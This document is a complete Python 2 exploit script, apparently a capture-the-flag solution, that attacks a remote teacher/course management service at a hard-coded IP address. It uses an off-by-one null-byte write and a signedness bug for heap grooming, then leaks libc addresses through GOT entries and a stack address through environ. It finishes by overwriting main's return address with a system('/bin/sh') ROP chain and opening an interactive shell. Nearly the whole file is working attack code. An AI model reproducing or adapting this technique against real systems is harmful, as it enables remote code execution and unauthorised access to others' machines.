#!/usr/bin/env python2.7

import socket
import struct
import sys
import telnetlib


ADDR = "149.13.33.84"
PORT = 1520
DEBUG = False

s = socket.create_connection((ADDR, PORT))

def p64(a):
    return struct.pack("<Q", a)

def rtil_str(st):
    buf = ""
    x = 0
    while True:
        curr = s.recv(1)
        if curr == "":
            break
        buf += curr
        if(curr == st[x]):
            x += 1
            if x == len(st):
                break
        else:
            x = 0
    if DEBUG:
        sys.stdout.write(buf)
    return buf

def send_all(st):
    tot = 0
    while tot != len(st):
        tot += s.send(st)

def comm(rx, tx):
    rtil_str(rx)
    send_all(tx)


def add_teacher(name, age, notes=None):
    comm(">> ", name + "\n")
    comm(">> ", str(age) + "\n")
    if notes is not None:
        comm(">> ", "y\n")
        comm(">> ", notes + "\n")
    else:
        comm(">> ", "n\n")

def add_teachers(teachers):
    n = len(teachers)
    s.send("1\n")
    comm(">> ", str(n) + "\n")
    idx = 0
    for t in teachers:
    	print "teacher: %d"%(idx)
        add_teacher(t[0], t[1], t[2])
	idx += 1
    return rtil_str(">> ")

def edit_teacher(tid, name, age, notes=None):
    s.send("4\n")
    comm(">> ", str(tid) + "\n")
    add_teacher(name, age, notes)


def add_course(title, tid, summary, desc, desclen=None, e=False):
    if desclen == None:
        desclen = len(desc)
        
    send_all("2\n")
    b = rtil_str("\n")
    if "last time" in b:
        if e == True:
	    comm(">> ", "Y\n")
	    comm(">> ", title + "\n")
	    comm(">> ", str(tid) + "\n")
	    comm(">> ", summary + "\n")
	    comm(">> ", str(desclen) + "\n")
	    comm(">> ", desc + "\n")
        else:
	    comm(">> ", "N\n")
	    comm(">> ", str(desclen) + "\n")
	    comm(">> ", desc + "\n")

    else:
	comm(">> ", title + "\n")
	comm(">> ", str(tid) + "\n")
	comm(">> ", summary + "\n")
	comm(">> ", str(desclen) + "\n")
	comm(">> ", desc + "\n")

    return rtil_str(">> ")

def list_teachers(tid):
    s.send("3\n")
    comm(">> ", str(tid) + "\n")
    return rtil_str(">> ")

def list_courses():
    s.send("5\n")
    return rtil_str(">> ")


# we have an underflow off-by-one
# which allows us to write one null byte below
# we also have a signedness bug which allows
# us to create a large amount of 'teachers' 
# without having to fill their buffers
# this is helpful because if we had to fill in all those
# teacher buffers it would be insanely slow
# we can allocate as many 'courses' as we want which helps
# too

# idea is to 'saturate' the heap until we get an
# allocation that falls in the an address
# containing 0x4b0c0 which is the 0x0804b0c0 address
# without its MSByte
# after that exploitation is UAF-style

# rop shit
puts_got = 0x0804afd4
printf_got = 0x0804afd0
memcpy_got = 0x0804afc8

rtil_str(">> ")

print "[+] Saturating heap [+]"

add_course("a", 0, "b", "c", e=False)

for i in range(7):
    print "alloc number: %d"%(i)
    add_course("", i % 10, "x", "", 0xfffffff * 2, e=True)

for i in range(21):
    print "alloc number: %d"%(i)
    add_course("", i % 10, "x", "", 0xffff00 , e=True)

# rip appart teacher buffer
print "[+] Allocating teacher_buffer [+]"
s.send("1\n")
rtil_str(">> ")
s.send("-1\n")

# overwrite the fucking last_title pointer's MSByte
s.send("2\n")
rtil_str(">> ")
s.send("y\n")
rtil_str(">> ")
s.send("test\n")
rtil_str(">> ")
s.send("10\n")
rtil_str(">> ")
rtil_str(">> ")
desc = "poop"
s.send(str(len(desc) + 1) + "\n")
rtil_str(">> ")
s.send(desc + "\n")
rtil_str(">> ")
rtil_str(">> ")

# bam it up
s.send("2\n")
rtil_str(">> ")
s.send("y\n")
rtil_str(">> ")

buf = "A" * 72
buf += struct.pack("<I", puts_got)
buf = buf.ljust(127, "Z")
s.send(buf + "\n")
rtil_str(">> ")
s.send("0\n")
rtil_str(">> ")
s.send("poop\n")
rtil_str(">> ")
s.send("1\n")
rtil_str(">> ")
s.send("\n")

lkbuf = list_teachers(49)
lkbuf = rtil_str(">> ").split("\n")[1].split("Name: ")[1] 
puts_addr = struct.unpack("<I", lkbuf)[0]
print "[+] Leaked address of puts: %s [+]"%hex(puts_addr)
environ_addr = puts_addr + 0x1441f0
system_addr = puts_addr - 0x24f40
sh_str = puts_addr + 0xf8e74

print "[+] Address of environ: %s [+]"%(hex(environ_addr))
print "[+] Address of system: %s [+]"%(hex(system_addr))


s.send("2\n")
rtil_str(">> ")
s.send("y\n")
rtil_str(">> ")

buf = "A" * 72
buf += struct.pack("<I", environ_addr)
buf = buf.ljust(127, "Z")
s.send(buf + "\n")
rtil_str(">> ")
s.send("0\n")
rtil_str(">> ")
s.send("poop\n")
rtil_str(">> ")
s.send("1\n")
rtil_str(">> ")
s.send("\n")

lkbuf = list_teachers(49)
lkbuf = rtil_str(">> ").split("\n")[1].split("Name: ")[1] 
stack_addr = struct.unpack("<I", lkbuf)[0]
print "[+] Leaked stack address: %s [+]"%hex(stack_addr)

# points to the return address of main
target_addr = stack_addr - 0xd0

# now do the write
s.send("2\n")
rtil_str(">> ")
s.send("y\n")
rtil_str(">> ")

buf = "A" * 72
buf += struct.pack("<I", target_addr)
buf = buf.ljust(127, "Z")
s.send(buf + "\n")
rtil_str(">> ")
s.send("0\n")
rtil_str(">> ")
s.send("poop\n")
rtil_str(">> ")
s.send("1\n")
rtil_str(">> ")
s.send("\n")

# finish in beaute
s.send("4\n")
rtil_str(">> ")
s.send("49\n")
rtil_str(">> ")

# rop chain
buf = struct.pack("<I", system_addr)
buf += "JUNK"
buf += struct.pack("<I", sh_str)

s.send(buf + "\n")

t = telnetlib.Telnet()
t.sock = s
t.interact()
